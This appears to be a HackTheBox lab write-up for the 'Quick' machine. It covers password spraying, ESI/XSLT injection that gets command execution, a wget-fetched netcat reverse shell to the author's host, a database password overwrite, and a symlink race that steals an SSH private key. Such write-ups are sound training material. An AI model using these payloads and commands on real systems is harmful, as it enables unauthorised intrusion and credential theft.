---
title: HackTheBox - Quick
layout: post
date: 2020-08-29 23:00:00 +0800
---

![3fc3502d18aa8a519950baa15b816a22.png](/images/htb-quick/0f72e32114e54ddc8c62d612eec5f659.png)

### 0. Preface

This box took a lot of time and a lot of tears. It definitely wasn't *quick* at all.  

After how hard the rest of the box is, root is pretty brainless in comparison. Also, if you're still running ESIGate 5.2 and below (or really, anything that is vulnerable to ESI injection), please update it. 

Gear up for the longest write-up I have written yet. 
	
In this box, we will be tackling: 

1. [HTTP/3](https://http3.net/)
2. Guessing email addresses to password spray
3. ESI injection
4. *Quick*ly symlinking files
5. Reading some log files to root

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -oN nmap.txt 10.10.10.186 -v
```

![e3dc9c76334316735ef5de9811815ef4.png](/images/htb-quick/060fed7005b740a68e4c96a6f9963d31.png)

This seems to be an Ubuntu box. There is only an Apache web server running on port 9001. 

### 2. Web Server

Let's check out the web server. There is a link in the page pointing to `portal.quick.htb`. For now, we will add both `quick.htb` and `portal.quick.htb` to our hosts file and check it out later. 

![15815399e67d4530e18d7ab904497ead.png](/images/htb-quick/3daa1c8ddde643d6ae4b6e688aa3c227.png)

Poking around a bit, we see some testimonials at the bottom of the page. This will come in useful later on.

![5139866184083f6f2654ea7682a7ccd9.png](/images/htb-quick/e2be293ad9ac435bac73ef15d3d9973c.png)

`/clients.php` also turns up a list of countries the companies are in. This will also come in handy later. 

![65357f6599bd791d428301b0b2614fee.png](/images/htb-quick/8eeeb79af9d1438987b0b1a993f56882.png)

`/login.php` doesn't have anything much of note, and we are unable to do SQL injection or XSS here. 

![1f3bba31c6a976bf2ffbadc2cd7bd45c.png](/images/htb-quick/2f1e3e84747046adbeee260ec376b585.png)

Let's try accessing `https://portal.quick.htb` next. 

![efbe6cc6850d51ef8eee2517791feccd.png](/images/htb-quick/99c8ba8b98054a1ca3b63e5f478426d2.png)

However, TCP port 443 isn't open on this box. Let's move on to using `gobuster` on the main page. 

```text
gobuster dir -u http://quick.htb:9001 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster.txt
```

![36992ce428e5c248989a43c26504b8b8.png](/images/htb-quick/a1ed88158c6947969f10dfd006a7b9a6.png)

We randomly visit `search.php`, and proxy it through burpsuite. 

![a1799be7d94927371e9484af0c2bfeda.png](/images/htb-quick/bdd00dcaaa9e40c8803a2c06cc969572.png)

The headers are interesting - X-Powered-By: Esigate is not a standard HTTP header. After some googling, we find that Esigate is something that is able to integrate and combine different web applications for a website. It also supports [ESI (Edge Side Includes)](https://www.w3.org/TR/esi-lang/). 

We also find that this version of Esigate is at least 4.0, based on the list of [available extensions](http://www.esigate.org/reference.html#Available_extensions). 

![df69d0317d185d6a5b6b6ffcac2e52ce.png](/images/htb-quick/1dcf548aaaf34ef39f33132493421b25.png)

Looking around, we find a [possible exploit](https://github.com/esigate/esigate/issues/209) on the GitHub repository for Esigate. We will come back to this later. 

For now, we can run another `nmap` scan, this time on UDP instead.

```text
sudo nmap -sC -sV -v -oN nmap-udp.txt -sU 10.10.10.186
```

![c05aef8981afa0bff686cff56133079b.png](/images/htb-quick/faee4b65cd45471694613517da375622.png)

It seems like UDP 443 is open. This hints at HTTP/3, which is HTTP over the QUIC protocol. Unfortunately, `curl` by default doesn't support HTTP/3 unless you manually build it.

Fortunately, we can install [Cloudflare's Quiche](https://github.com/cloudflare/quiche) which will allow us to send GET requests HTTP/3 servers from the commandline. This is a lot less complicated to build than `curl`. 

I will not be going through the steps to build this, so just follow the instructions on the Github repository. 

After it is built, we can run `http3-client` to test it out. 

```text
./http3-client https://portal.quick.htb
```

![954dfbbcaea2903a7858ccccde01240e.png](/images/htb-quick/c9411808e2f6463cbc30c8c1a5d46072.png)

Awesome, we have something. 

### 3. Enumerating HTTP3

Let's start by grabbing any links that are accessible from `portal.quick.htb`. 

```text
./http3-client https://portal.quick.htb/index.php >> index-page.html
./http3-client https://portal.quick.htb/index.php?view=contact >> contact.html
./http3-client https://portal.quick.htb/index.php?view=about >> about.html
./http3-client https://portal.quick.htb/index.php?view=docs >> docs.html
```

There are some pdf files in `/docs`, so let's grab those too. 

```text
./http3-client https://portal.quick.htb/docs/QuickStart.pdf >> QuickStart.pdf
./http3-client https://portal.quick.htb/docs/Connectivity.pdf >> Connectivity.pdf
```

Let's start enumerating the files. 

![48a8d3b63afc3b9e973122c713e52443.png](/images/htb-quick/b8d3cd0dca7942689931a852a2d04b2e.png)

Looking inside `about.html`, we see that there are three email addresses we can potentially use for the login page on `quick.htb:9001/login.php`. 

Nothing much around here, so let's move on to the pdf files. Let's start with `Connectivity.pdf`.

![1791b0af317031d92f09360b6e4be7e4.png](/images/htb-quick/52ab3e59bc764384a17e4b8bef0e3a8d.png)

We can use the default password of `Quick4cc3$$` to password spray. Moving on to `QuickStart.pdf`.  

![1b2846868c4ac73196b10ff6ad92c361.png](/images/htb-quick/3b573c9c4a954c6a90eda53a7f01598c.png)

There's nothing much in `QuickStart.pdf`, so we'll move on to trying the emails and password we found earlier on the login page. 

Unfortunately, none of the above email addresses found earlier work with the default password. But recall in the testimonials that we have a couple of names + companies; and inside `/clients.php` we have a list of companies and their locations? 

Let's build a couple of email addresses out of it. We can make use of common country TLDs and guessing the company email domains.

![e61f9075a42aef5a28b4b2fc9c69ad87.png](/images/htb-quick/247ebb39ea874ee48de0440a14f5ea38.png)

Next, we can use `hydra` to password spray with the default password of `Quick4cc3$$`. 

```text
hydra -L userlist.txt -p "Quick4cc3$$" "http-post-form://quick.htb:9001/login.php:email=^USER^&password=^PASS^:Invalid Credentials"
```

![e8c9aadf26b5b136877f21c343f4c18f.png](/images/htb-quick/c347abfe64f3472abbee5767dac57e8f.png)

Awesome, we got three valid user accounts from `hydra` - `elisa@wink.co.uk:Quick4cc3$$`, `elisa@wink-media.uk:Quick4cc3$$` and `james@lazy-coop.cn:Quick4cc3$$`. 

![55c0090ac975cf188e97071b42dc4593.png](/images/htb-quick/588944b7dcd94bc5ac8f26ba83c83b7d.png)

Only `elisa@wink.co.uk:Quick4cc3$$` seems to be working though.

### 4. Exploiting ESI Injections

Now that we have logged in, let's take a look at the page source. 

![fb00fccd0bc5297d80ef8b3f727e6650.png](/images/htb-quick/d2d1226a13f7490bb977bf0f13f359e0.png)

The search bar seems to be calling `/search.php?TICKETNUMBER` and outputting the results via javascript. Let's try to create a new ticket on `/ticket.php`. 

![80319230dfbd9fb252677428ec414b61.png](/images/htb-quick/99312d9124404955bc55f1d9a37a3aff.png)

![c0e52c352a4d834a20f2d01919b07350.png](/images/htb-quick/1feecfb92da843deb5d195a47cf38f45.png)

Searching for the ticket number turns up the ticket we created earlier.

![99fc87f5de9cb9abb9e35237fdc859ae.png](/images/htb-quick/7f2643dc235145ffa4b7efa38cc60aa2.png)

Let's try inserting HTML into the ticket fields. 

![a9fea69299ffec0ad90874b0bb8f093b.png](/images/htb-quick/2b346e70bc7b456b907a2917e53c31dc.png)

![927894cd5201e868bb6ce06e0fc89d58.png](/images/htb-quick/fc6bd3b76b9e44bb8e67a83859aa6a65.png)

Now, let's try running some javascript. Javascripts can only be triggered from `/search.php?search=TICKETNUMBER` since the homepage only displays text results taken from `/search.php`. 

```
<script>alert("test");</script>
```

![7bbecdf86dbd25bd07414dabdde1f65c.png](/images/htb-quick/5476ae095e034f1e96603ee9ab6aefa0.png)

Recall that [exploit](https://github.com/esigate/esigate/issues/209) we found earlier? Let's try it out. 

```html
<esi:include src="http://10.10.14.29:8000/test.jpg" />
```

![aad4677a8cebd2ba6fe5c5d916bc9f40.png](/images/htb-quick/66da9fb628ca445cba3e356aad31bb4a.png)

Now to figure out exactly what we can inject into this. Looking around we find [two](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [articles](https://www.acunetix.com/blog/articles/the-hidden-dangers-of-xsltprocessor-remote-xsl-injection/) going into the exploit details. 

Let's try to inject the following code, which needs to retrieve an `.xsl` file from our local machine. 

```xml
<!-- INJECTION -->
<esi:include src="http://10.10.14.29:8888/FILENAME.xsl" stylesheet="http://10.10.14.29:8888/FILENAME.xsl"></esi:include>
```

```xml
<!-- XSL FILE -->
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<!-- COMMANDS GO BELOW -->
<xsl:variable name="cmd">
        <![CDATA[
                <!-- insert command here -->
        ]]>
</xsl:variable>
<!-- COMMANDS GO ABOVE -->
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

Each time the commands are run, a new ticket will need to be created with the above `esi:include` injection. Navigating to `/search.php?search=TICKETNUMBER` will execute the script. 

Let's upload a netcat binary that can execute commands.

```xml
<!-- <esi:include /> -->
<esi:include src="http://10.10.14.29:8888/upload.xsl" stylesheet="http://10.10.14.29:8888/upload.xsl"></esi:include>
```

```xml
<!-- upload.xsl -->
<xsl:variable name="cmd">
        <![CDATA[
                wget http://10.10.14.29:8181/nc
        ]]>
</xsl:variable>
```

![157fc1cf4fadd9f8334bf7f4c6ec06c2.png](/images/htb-quick/923496e18b8c4e1ba08afdedf8fedc7e.png)

Now we need to make it executable. 

```xml
<!-- <esi:include /> -->
<esi:include src="http://10.10.14.29:8888/chmod.xsl" stylesheet="http://10.10.14.29:8888/chmod.xsl"></esi:include>
```

```xml
<!-- chmod.xsl -->
<xsl:variable name="cmd">
        <![CDATA[
                chmod +x ./nc
        ]]>
</xsl:variable>
```

![c521db6c9d55f57e163af985f952a0aa.png](/images/htb-quick/4354278495a8485ea8c635467ff87d16.png)

Now let's start a netcat listener and execute a reverse shell back to us. 

```xml
<!-- <esi:include /> -->
<esi:include src="http://10.10.14.29:8888/exec.xsl" stylesheet="http://10.10.14.29:8888/exec.xsl"></esi:include>
```

```xml
<!-- exec.xsl -->
<xsl:variable name="cmd">
        <![CDATA[
                nc -e /bin/sh 10.10.14.29 8000
        ]]>
</xsl:variable>
```

After upgrading to a full interactive shell with python3, let's grab the user flag from `/home/sam`. 

![974e43dbdb8a43d8d0cf6b87c7f289ef.png](/images/htb-quick/76407786a5ef4b6593885190fa58782e.png)

### 5. SSH, Further Enumeration

Let's next take a look at `/etc/passwd`. 

![45e56fa4ebebcf801ed9b7c8b4c8c22e.png](/images/htb-quick/323fe52d98f14189a1f681428ac8b95f.png)

We see that there's another user on this box, `srvadm`. Let's move on to the `/var/www/` folder. 

![563d3c6863ab0bee1e3e509fbb9b395b.png](/images/htb-quick/d5cdb133fa794866ad23ad915a7c404e.png)

We found database credentials in `db.php` - `db_adm:db_p4ss`. Let's try logging into mysql with those credentials and enumerate the databases available to us.

![614dbfcba31cc2bd0bf36ea6f88f8cc0.png](/images/htb-quick/040ef434c00747c5bb298c1bf72bd2da.png)

Enumerating the `quick` database further, we find that the database has a users table. 

![39b4aeb01750ed1d196723b1e44868a0.png](/images/htb-quick/a396c835a945405394e05741c85fb1fe.png)

There's also an `srvadm` user in the database, with the password hash. We can try to use `john` on the hash, but we are unable to crack it. 

![887bd0be0e357b3e054dcc8e43559caa.png](/images/htb-quick/300f0a0543df446087540336590d8502.png)

Looking in `login.php`, see that the passwords are encrypted using MD5 and the PHP crypt function with the salt of 'fa'. 

![ed80c95469ea9c5b32deab6f7c957c2e.png](/images/htb-quick/d75fb0a6b5e842beb671af7888c88a77.png)

This didn't seem to be crackable at first, but I learnt after finishing this box that I just didn't manage to find the correct way to crack this (*and I'm still unable to*).

Moving on, let's change the password in the database itself to `Quick4cc3$$`, using the hashed password for `elisa@wink.co.uk`

```sql
use quick;
update users set password='c6c35ae1f3cb19438e0199cfa72a9d9d' where name='Server Admin' limit 1;
```

![2c94e8f58db7cd661a083583ca05850e.png](/images/htb-quick/2cbc7382ce984d8f9e62c01da5f8825c.png)

Let's try logging in to `quick.htb:9001/login.php` again with the "new" credentials. 

![2fa421cfe8e8f09a89f30d7a8b836d5e.png](/images/htb-quick/e51dca312bd74dbc9f6d29b8cde7a3cb.png)

You'll still get into Elisa's account anyway, so let's move on. 

### 6. Sending Files to a Fake Printer

Back on the box, we notice there's another directory in `/var/www`. 

![7da7a7b6cccdc409b1fec9306d53929a.png](/images/htb-quick/5d09ab8b6038473e864b21b12658bc91.png)

Let's take a look in the apache config to see what this is all about. 

![a34cf6e31e76b7c614eb509c0c13f031.png](/images/htb-quick/73e373441c6846c993879cff01ab86d4.png)

There is another site available in `http://printerv2.quick.htb:9001`, with the root directory of `/var/www/printer`. 

![42698573fa01dd2993bcaced64f04b7d.png](/images/htb-quick/f296d6b90a5f48dfacf16e0064600ad5.png)

Further enumerating the `/var/www/printer` directory, we see that the login to that uses `srvadm@quick.htb` and the same password in the `quick` database. 

Let's try to login with the "new" creds to `http://printerv2.quick.htb:9001`.

![352a8e3f878315e8213e43385ac41989.png](/images/htb-quick/5591da85f3ce43018483d468f5cf7c35.png)

Now that we're in let's try to add a printer. We need to setup a python3 http.server on port 9100 before doing so. 

![7b89f335375e7296c2faaceab7a28269.png](/images/htb-quick/6892154c78dc49e0aa888b1b3456a6d9.png)

![9d496de9c71c3dd0eebf1c4818616fcf.png](/images/htb-quick/2ed57d5307a341659aac535813f5f9aa.png)

Next, let's try adding a job and sending it over to our "printer". 

![2d610fa777f2b7330f19d67732d835d8.png](/images/htb-quick/9ff6bc12bb9743e5883caf7f00d841a2.png)

![f3207cfdc9d1e288d451a6287039787f.png](/images/htb-quick/04adaecdfb854339a1f15273da3620ae.png)

We got something back from the machine. Nice. Let's see what this actually does in `/var/www/printer/job.php`. 

![51c6cfcdef1033ab65002618b810667d.png](/images/htb-quick/12b7e025018d45d088c1115497dcd54c.png)

This seems to be putting a file in `/var/www/jobs`, then chmod to 0777, [which doesn't work because it's in quotes](https://www.php.net/manual/en/function.chmod.php#96086). The file will be named using the current date and time in the format of `Y-m-d_H:i:s`. Next, it gets the printer IP address and port number from the `jobs` table in the `quick` database. Using the IP and port number, it creates a new NetworkPrintConnector, sends the file contents over to the printer and deletes the file. 

This means we need to be *quick*. Let's write a bash script to watch for and execute any file that matches `2020-08-24_*` in the `/var/www/jobs` directory. 

```bash
#!/bin/bash

FILE='2020-08-24_*'

while :
do
        if [ -e $FILE ]; then
                echo Exec
				bash ./2020-08-24_*
                break
        fi
done
```

When using the "printer" to execute `ls -la`, we find that the file is being written by `srvadm`. 

![72fd02bedc484adc2fa04b7b86c3f108.png](/images/htb-quick/e67ef4d13cad406b9c3f40eef9b54d94.png)

Now we just need to modify the script to quickly delete and link  `/home/srvadm/.ssh/id_rsa` instead, which should send us the SSH private key of `srvadm`. 

```bash
#!/bin/bash

FILE='2020-08-24_*'

while :
do
        if [ -e $FILE ]; then
                echo Exec
                FILENAME=$(basename 2020-08-24_*)
                rm -f $FILENAME
                ln -s /home/srvadm/.ssh/id_rsa $FILENAME
                break
        fi
done
```

We need to use netcat to capture the file instead, due to line terminators that make the python3 http.server close the connection after the first line of the file. 

![f882a68d3b2f7c50504b0272c9c092f5.png](/images/htb-quick/df044984ade24fda96a021f2a8c4e526.png)

Awesome, let's login as `srvadm` using the private key. 

![faba5b9dfc644dc6fe2f3ad85d8110a0.png](/images/htb-quick/cc7bb2290c4849f1a1b742ca32db5d88.png)

### 7. Root

Enumerating a bit, we find a couple of pretty interesting files in `~/.cache`. 

![7ca5890d99dbccfd9996a62f1f786558.png](/images/htb-quick/d283c7081ec74b49ba7fde50a2199eb0.png)

Looking inside `~/.cache/conf.d/printers.conf`, we find what seems to be a username and password for `printerv3.quick.htb`. However, that vhost doesn't exist on the box. 

![e2c085037d26e3a3849af47c10291add.png](/images/htb-quick/7673052b8a144e09852a73f5ce8e433b.png)

The next part took me a whole day to figure out. Considering how hard the rest of the box was, I thought it was more complicated. 

Let's first URL decode the password value from `%26ftQ4K3SGde8%3F` to `&ftQ4K3SGde8?`. 

It's as simple as...

```
su - root
```

...yeah.

![53cabb01c83a40cec3966403388f2a5f.png](/images/htb-quick/479dac7b6ac44c50aa45ff630f72853d.png)
